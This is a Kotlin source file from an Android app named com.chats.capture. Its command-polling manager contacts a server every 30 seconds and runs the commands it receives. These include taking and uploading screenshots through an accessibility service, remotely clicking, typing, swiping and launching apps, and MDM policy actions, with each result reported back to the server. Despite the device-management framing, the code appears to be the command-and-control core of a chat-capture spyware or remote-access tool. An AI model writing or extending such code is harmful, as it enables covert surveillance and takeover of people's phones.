package com.chats.capture.managers

import android.content.Context
import com.chats.capture.mdm.AppManager
import com.chats.capture.mdm.MDMManager
import com.chats.capture.mdm.PolicyManager
import com.chats.capture.CaptureApplication
import com.chats.capture.managers.ScreenshotManager
import com.chats.capture.network.ApiClient
import com.chats.capture.network.CommandResultRequest
import com.chats.capture.network.RemoteCommand
import com.chats.capture.network.RemoteControlService
import com.chats.capture.network.ServerCommand
import com.google.gson.Gson
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import timber.log.Timber

/**
 * Manages command polling from server
 * Polls every 30 seconds for pending commands and executes them
 */
class CommandPollingManager(private val context: Context) {
    
    private val pollingScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var isPolling = false
    
    private val mdmManager = MDMManager(context)
    private val appManager = AppManager(context, mdmManager)
    private val policyManager = PolicyManager(context, mdmManager)
    private val remoteControlService = RemoteControlService(context, mdmManager, appManager, policyManager)
    private val remoteUIControlManager = RemoteUIControlManager(context)
    
    private val POLLING_INTERVAL_MS = 30 * 1000L // 30 seconds
    
    /**
     * Start polling for commands
     */
    fun startPolling() {
        if (isPolling) {
            Timber.d("Command polling already started")
            return
        }
        
        isPolling = true
        Timber.d("Starting command polling (every ${POLLING_INTERVAL_MS / 1000} seconds)")
        
        pollingScope.launch {
            while (isActive && isPolling) {
                try {
                    pollAndExecuteCommands()
                } catch (e: Exception) {
                    Timber.e(e, "Error in command polling")
                }
                
                delay(POLLING_INTERVAL_MS)
            }
        }
    }
    
    /**
     * Stop polling for commands
     */
    fun stopPolling() {
        Timber.d("Stopping command polling")
        isPolling = false
    }
    
    /**
     * Poll server for pending commands and execute them
     */
    private suspend fun pollAndExecuteCommands() {
        try {
            if (!ApiClient.isNetworkAvailable(context)) {
                Timber.v("Network not available, skipping command poll")
                return
            }
            
            val deviceRegistrationManager = DeviceRegistrationManager(context)
            val deviceId = deviceRegistrationManager.getDeviceId()
            
            val apiService = ApiClient.getApiService()
            val response = apiService.getPendingCommands(deviceId)
            
            if (!response.isSuccessful) {
                Timber.w("Failed to fetch pending commands: ${response.code()}")
                return
            }
            
            val body = response.body()?.string() ?: ""
            
            // Handle plain text "OK" response (no commands)
            if (body.trim() == "OK" || body.isEmpty()) {
                Timber.v("No pending commands")
                return
            }
            
            // Try to parse as JSON
            val commands = try {
                val gson = Gson()
                val commandsResponse = gson.fromJson(body, com.chats.capture.network.CommandsResponse::class.java)
                
                if (commandsResponse == null || !commandsResponse.success) {
                    Timber.v("No pending commands or error in response")
                    return
                }
                
                commandsResponse.commands ?: emptyList()
            } catch (e: Exception) {
                Timber.w("Failed to parse commands response: $body")
                return
            }
            
            if (commands.isEmpty()) {
                Timber.v("No pending commands")
                return
            }
            
            Timber.d("Found ${commands.size} pending command(s)")
            
            // Execute each command
            for (commandData in commands) {
                executeCommand(commandData)
            }
        } catch (e: Exception) {
            Timber.e(e, "Error polling for commands")
        }
    }
    
    /**
     * Execute a single command and report result
     */
    private suspend fun executeCommand(commandData: ServerCommand) {
        val commandId = commandData.id ?: return
        val action = commandData.action ?: return
        
        Timber.d("Executing command: id=$commandId, action=$action")
        
        try {
            // Handle screenshot command separately (requires AccessibilityService)
            if (action == "capture_screenshot") {
                executeScreenshotCommand(commandId)
                return
            }
            
            // Handle UI control commands (require AccessibilityService)
            if (action.startsWith("ui_")) {
                executeUICommand(commandId, action, commandData.parameters)
                return
            }
            
            // Convert server command format to RemoteCommand format
            val parameters = parseParameters(commandData.parameters)
            val remoteCommand = RemoteCommand(
                action = action,
                parameters = parameters
            )
            
            // Execute command
            val result = remoteControlService.executeRemoteCommand(remoteCommand)
            
            // Report result to server
            reportCommandResult(commandId, result.success, result.message, result.data)
            
            Timber.d("Command executed: id=$commandId, success=${result.success}")
        } catch (e: Exception) {
            Timber.e(e, "Error executing command: $commandId")
            reportCommandResult(commandId, false, "Error: ${e.message}", null)
        }
    }
    
    /**
     * Execute screenshot command (requires AccessibilityService)
     */
    private suspend fun executeScreenshotCommand(commandId: String) {
        try {
            val app = context.applicationContext as CaptureApplication
            val accessibilityService = app.enhancedAccessibilityService
            
            if (accessibilityService == null) {
                Timber.w("EnhancedAccessibilityService not available for screenshot capture")
                reportCommandResult(commandId, false, "AccessibilityService not available", null)
                return
            }
            
            val screenshotManager = ScreenshotManager(context, accessibilityService)
            screenshotManager.captureAndUploadScreenshot()
            
            // Wait a bit for capture and upload
            delay(3000)
            
            reportCommandResult(commandId, true, "Screenshot captured and uploaded", null)
            Timber.d("Screenshot command executed: $commandId")
        } catch (e: Exception) {
            Timber.e(e, "Error executing screenshot command: $commandId")
            reportCommandResult(commandId, false, "Error: ${e.message}", null)
        }
    }
    
    /**
     * Execute UI control command
     */
    private suspend fun executeUICommand(commandId: String, action: String, parameters: Any?) {
        try {
            val params = parseParameters(parameters)
            val packageName = params["package"]
            
            val success = when (action) {
                "ui_click" -> {
                    val x = params["x"]?.toFloatOrNull() ?: 0f
                    val y = params["y"]?.toFloatOrNull() ?: 0f
                    remoteUIControlManager.executeUIClick(x, y, packageName)
                }
                "ui_find_and_click" -> {
                    val text = params["text"] ?: return reportCommandResult(commandId, false, "Missing 'text' parameter", null)
                    remoteUIControlManager.executeUIFindAndClick(text, packageName)
                }
                "ui_find_and_click_by_id" -> {
                    val viewId = params["view_id"] ?: return reportCommandResult(commandId, false, "Missing 'view_id' parameter", null)
                    remoteUIControlManager.executeUIFindAndClickById(viewId, packageName)
                }
                "ui_input" -> {
                    val text = params["text"] ?: return reportCommandResult(commandId, false, "Missing 'text' parameter", null)
                    val findText = params["find_text"]
                    val viewId = params["view_id"]
                    remoteUIControlManager.executeUIInput(text, findText, viewId, packageName)
                }
                "ui_scroll" -> {
                    val direction = params["direction"] ?: return reportCommandResult(commandId, false, "Missing 'direction' parameter", null)
                    remoteUIControlManager.executeUIScroll(direction, packageName)
                }
                "ui_swipe" -> {
                    val startX = params["start_x"]?.toFloatOrNull() ?: 0f
                    val startY = params["start_y"]?.toFloatOrNull() ?: 0f
                    val endX = params["end_x"]?.toFloatOrNull() ?: 0f
                    val endY = params["end_y"]?.toFloatOrNull() ?: 0f
                    val duration = params["duration"]?.toLongOrNull() ?: 300L
                    remoteUIControlManager.executeUISwipe(startX, startY, endX, endY, duration)
                }
                "ui_launch_app" -> {
                    val pkg = packageName ?: params["package_name"] ?: return reportCommandResult(commandId, false, "Missing 'package' or 'package_name' parameter", null)
                    remoteUIControlManager.executeUILaunchApp(pkg)
                }
                else -> {
                    reportCommandResult(commandId, false, "Unknown UI command: $action", null)
                    return
                }
            }
            
            val message = if (success) "UI command executed successfully" else "UI command execution failed"
            reportCommandResult(commandId, success, message, null)
            Timber.d("UI command executed: id=$commandId, action=$action, success=$success")
        } catch (e: Exception) {
            Timber.e(e, "Error executing UI command: $commandId")
            reportCommandResult(commandId, false, "Error: ${e.message}", null)
        }
    }
    
    /**
     * Parse parameters from server command format
     */
    private fun parseParameters(parameters: Any?): Map<String, String> {
        return try {
            when (parameters) {
                is Map<*, *> -> {
                    parameters.mapNotNull { (key, value) ->
                        val keyStr = key?.toString() ?: return@mapNotNull null
                        val valueStr = value?.toString() ?: return@mapNotNull null
                        keyStr to valueStr
                    }.toMap()
                }
                is String -> {
                    if (parameters.isNotEmpty()) {
                        val gson = Gson()
                        val jsonObject = gson.fromJson(parameters, Map::class.java)
                        jsonObject.mapNotNull { (key, value) ->
                            val keyStr = key?.toString() ?: return@mapNotNull null
                            val valueStr = value?.toString() ?: return@mapNotNull null
                            keyStr to valueStr
                        }.toMap()
                    } else {
                        emptyMap()
                    }
                }
                else -> emptyMap()
            }
        } catch (e: Exception) {
            Timber.e(e, "Error parsing command parameters")
            emptyMap()
        }
    }
    
    /**
     * Report command execution result to server
     */
    private suspend fun reportCommandResult(commandId: String, success: Boolean, message: String?, data: String?) {
        try {
            val apiService = ApiClient.getApiService()
            val resultRequest = CommandResultRequest(
                success = success,
                message = message,
                data = data
            )
            
            val response = apiService.updateCommandResult(commandId, resultRequest)
            if (response.isSuccessful) {
                Timber.d("Command result reported: $commandId")
            } else {
                Timber.w("Failed to report command result: ${response.body()?.message}")
            }
        } catch (e: Exception) {
            Timber.e(e, "Error reporting command result")
        }
    }
}
